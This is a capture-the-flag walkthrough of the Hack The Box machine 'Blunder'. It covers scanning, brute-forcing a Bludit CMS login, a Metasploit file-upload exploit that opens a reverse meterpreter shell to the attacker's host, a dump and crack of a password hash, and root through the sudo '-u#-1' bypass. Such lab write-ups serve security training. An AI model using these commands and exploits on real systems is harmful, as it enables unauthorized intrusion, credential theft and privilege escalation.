# BLUNDER


## NMAP

```
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/blunder]
└─$ nmap 10.10.10.191 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 07:45 EDT
Nmap scan report for 10.10.10.191
Host is up (0.35s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE
21/tcp closed ftp
80/tcp open   http

Nmap done: 1 IP address (1 host up) scanned in 36.77 seconds
                                                                                       
┌──(kali㉿kali)-[~/Downloads/hackthebox/blunder]
└─$ nmap 10.10.10.191 -p 21,80 -A
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-19 07:45 EDT
Nmap scan report for 10.10.10.191
Host is up (0.29s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.56 seconds
```

## PORT 80

### HOMEPAGE

![](https://github.com/Leo-2807/Writeups/blob/main/images/blunder1.png)

## GOBUSTER

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blunder]
└─$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.191 -t 100 -x .txt,.jpg,.php -q
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htpasswd.jpg        (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.hta.txt             (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htaccess.jpg        (Status: 403) [Size: 277]
/.hta.jpg             (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/0                    (Status: 200) [Size: 7562]
/.hta.php             (Status: 403) [Size: 277] 
/about                (Status: 200) [Size: 3281]
/admin                (Status: 301) [Size: 0] [--> http://10.10.10.191/admin/]
/cgi-bin/             (Status: 301) [Size: 0] [--> http://10.10.10.191/cgi-bin]
/install.php          (Status: 200) [Size: 30]                                 
/LICENSE              (Status: 200) [Size: 1083]                               
/robots.txt           (Status: 200) [Size: 22]                                 
/robots.txt           (Status: 200) [Size: 22]                                 
/server-status        (Status: 403) [Size: 277]                                
/todo.txt             (Status: 200) [Size: 118] 
```

### /TODO.TXT

![](https://github.com/Leo-2807/Writeups/blob/main/images/blunder2.png)

### /ADMIN

![](https://github.com/Leo-2807/Writeups/blob/main/images/blunder3.png)

## LOGIN

As we saw on the /todo.txt page the username can be fergus 

Instead of using a huge wordlist I decided to make a custom wordlist using the tool ```cewl```

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blunder]
└─$ cewl -m 8 -w pass.txt http://10.10.10.191/
CeWL 5.4.8 (Inclusion) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

On searching I found this [tool](https://github.com/ColdFusionX/CVE-2019-17240_Bludit-BF-Bypass)

On downloading and running the script

```
┌──(kali㉿kali)-[~/Downloads/hackthebox/blunder]
└─$ ./blud.py -l http://10.10.10.191/admin/ -u user.txt -p pass.txt                     
[*] Bludit Auth BF Mitigation Bypass Script by ColdFusionX 
     
[°] Brute Force: Testing -> fergus:interesting
[◒] Brute Force: Testing -> fergus:Creation
[▖] Brute Force: Testing -> fergus:November
[←] Brute Force: Testing -> fergus:National
[v] Brute Force: Testing -> fergus:description
[◑] Brute Force: Testing -> fergus:Bootstrap
[/] Brute Force: Testing -> fergus:bootstrap
[d] Brute Force: Testing -> fergus:Networks
[ ] Brute Force: Testing -> fergus:Copyright
[↑] Brute Force: Testing -> fergus:byEgotisticalSW
[◓] Brute Force: Testing -> fergus:Javascript
[b] Brute Force: Testing -> fergus:American
[v] Brute Force: Testing -> fergus:published
[b] Brute Force: Testing -> fergus:received
[o] Brute Force: Testing -> fergus:literature
[↖] Brute Force: Testing -> fergus:smartphones
[ ] Brute Force: Testing -> fergus:September
[┬] Brute Force: Testing -> fergus:supernatural
[↖] Brute Force: Testing -> fergus:suspense
[▖] Brute Force: Testing -> fergus:miniseries
[◣] Brute Force: Testing -> fergus:television
[┘] Brute Force: Testing -> fergus:including
[→] Brute Force: Testing -> fergus:approximately
[d] Brute Force: Testing -> fergus:collections
[↗] Brute Force: Testing -> fergus:Foundation
[°] Brute Force: Testing -> fergus:Distinguished
[◐] Brute Force: Testing -> fergus:Contribution
[◓] Brute Force: Testing -> fergus:probably
[◤] Brute Force: Testing -> fergus:fictional
[█] Brute Force: Testing -> fergus:character
[...../..] Brute Force: Testing -> fergus:RolandDeschain

[*] SUCCESS !!
[+] Use Credential -> fergus:RolandDeschain
```

## EXPLOIT

I used metasploit to gain a shell

```
msf6 > search bludit

Matching Modules
================

   #  Name                                          Disclosure Date  Rank       Check  Description
   -  ----                                          ---------------  ----       -----  -----------
   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability                                       


Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/bludit_upload_images_exec                                                                  

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(linux/http/bludit_upload_images_exec) > options

Module options (exploit/linux/http/bludit_upload_images_exec):

   Name        Current Setting  Required  Description
   ----        ---------------  --------  -----------
   BLUDITPASS                   yes       The password for Bludit
   BLUDITUSER                   yes       The username for Bludit
   Proxies                      no        A proxy chain of format type:host:port[,type:hos
                                          t:port][...]
   RHOSTS                       yes       The target host(s), range CIDR identifier, or ho
                                          sts file with syntax 'file:<path>'
   RPORT       80               yes       The target port (TCP)
   SSL         false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI   /                yes       The base path for Bludit
   VHOST                        no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Bludit v3.9.2


msf6 exploit(linux/http/bludit_upload_images_exec) > set RHOST 10.10.10.191
RHOST => 10.10.10.191
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITUSER fergus
BLUDITUSER => fergus
msf6 exploit(linux/http/bludit_upload_images_exec) > set BLUDITPASS RolandDeschain
BLUDITPASS => RolandDeschain
msf6 exploit(linux/http/bludit_upload_images_exec) > set LHOST 10.10.14.3
LHOST => 10.10.14.3
msf6 exploit(linux/http/bludit_upload_images_exec) > exploit

[-] Handler failed to bind to 10.10.14.3:4444:-  -
[-] Handler failed to bind to 0.0.0.0:4444:-  -
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
msf6 exploit(linux/http/bludit_upload_images_exec) > exploit

[*] Started reverse TCP handler on 10.10.14.3:4444 
[+] Logged in as: fergus
[*] Retrieving UUID...
[*] Uploading fFkeZxAYiC.png...
[*] Uploading .htaccess...
[*] Executing fFkeZxAYiC.png...
[*] Sending stage (39282 bytes) to 10.10.10.191
[+] Deleted .htaccess
[*] Meterpreter session 1 opened (10.10.14.3:4444 -> 10.10.10.191:41564) at 2021-08-19 10:02:56 -0400
shell

meterpreter > shell
Process 3683 created.
Channel 0 created.
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@blunder:/var/www/bludit-3.9.2/bl-content/tmp$ whoami
whoami
www-data
```

## USER.TXT

After enumerating the machine for quite some time I found this file 

```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cat users.php
cat users.php
<?php defined('BLUDIT') or die('Bludit CMS.'); ?>
{
    "admin": {
        "nickname": "Hugo",
        "firstName": "Hugo",
        "lastName": "",
        "role": "User",
        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
        "email": "",
        "registered": "2019-11-27 07:40:55",
        "tokenRemember": "",
        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
        "tokenAuthTTL": "2009-03-15 14:00",
        "twitter": "",
        "facebook": "",
        "instagram": "",
        "codepen": "",
        "linkedin": "",
        "github": "",
        "gitlab": ""}
}
```

I use this [online tool](https://crackstation.net/) to crack this hash 

![](https://github.com/Leo-2807/Writeups/blob/main/images/blunder4.png)


```
www-data@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ su hugo 
su hugo 
Password: Password120
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ whoami
whoami
hugo
hugo@blunder:/var/www/bludit-3.10.0a/bl-content/databases$ cd ~    
cd ~
hugo@blunder:~$ cat user.txt
cat user.txt
8eb5f78a684b4f19015b5151228ff896
```

## ROOT.TXT


Using ```sudo -l``` to chack the sudo privelges of our user

```
hugo@blunder:~$ sudo -l
sudo -l
Password: Password120

Matching Defaults entries for hugo on blunder:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hugo may run the following commands on blunder:
    (ALL, !root) /bin/bash
```

On doing google search I found this [exploit](https://www.exploit-db.com/exploits/47502)


```
hugo@blunder:~$ sudo -u#-1 /bin/bash
sudo -u#-1 /bin/bash
root@blunder:/home/hugo# whoami
whoami
root
root@blunder:/home/hugo# cat /root/root.txt
cat /root/root.txt
90a2b0dede57a53ba4c496c30d2336de
```